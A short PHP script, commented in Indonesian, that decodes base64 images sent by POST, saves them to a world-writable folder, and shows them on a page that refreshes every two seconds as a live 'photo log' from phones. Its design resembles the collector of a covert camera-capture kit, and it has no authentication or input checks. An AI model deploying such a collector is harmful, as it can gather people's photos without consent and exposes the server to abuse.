<?php
// Folder penyimpanan foto
$folder = "foto/";
if (!is_dir($folder)) {
    mkdir($folder, 0777, true);
}

// Cek apakah ada data image dari POST
if (isset($_POST['image'])) {
    // Bisa single atau array
    $images = $_POST['image'];

    // Pastikan $images adalah array
    if (!is_array($images)) {
        $images = [$images];
    }

    foreach ($images as $img) {
        if ($img != '') {
            $data = base64_decode($img);
            // Nama file unik: timestamp + uniqid
            $filename = $folder . "foto_" . round(microtime(true) * 1000) . "_" . uniqid() . ".jpg";
            file_put_contents($filename, $data);
        }
    }
}

// Baca semua foto di folder, urut dari terbaru
$files = array_diff(scandir($folder, SCANDIR_SORT_DESCENDING), array('.', '..'));
?>

<!DOCTYPE html>
<html>
<head>
    <title>Log Foto HP</title>
    <meta http-equiv="refresh" content="2">
    <style>
        body { font-family: Arial; text-align: center; }
        img { width: 150px; height: auto; margin: 10px; border: 1px solid #333; }
    </style>
</head>
<body>
<h2>📸 Foto Terbaru dari HP</h2>

<?php foreach ($files as $f): ?>
    <img src="<?= $folder . $f ?>" alt="Foto HP">
<?php endforeach; ?>

</body>
</html>
